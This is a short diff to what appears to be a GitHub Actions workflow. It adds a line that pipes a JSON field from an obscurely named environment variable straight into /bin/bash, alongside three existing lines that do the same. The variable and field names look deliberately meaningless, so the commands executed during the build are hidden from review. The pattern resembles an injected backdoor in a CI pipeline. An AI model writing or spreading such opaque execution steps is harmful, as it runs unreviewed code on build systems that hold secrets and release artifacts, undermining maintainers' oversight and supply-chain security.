@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
           echo $vnv71 | jq -r .d251 | /bin/bash
           echo $zh011 | jq -r .ch61829 | /bin/bash
+          printf '%s' "$i51" | jq -r .eic38 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
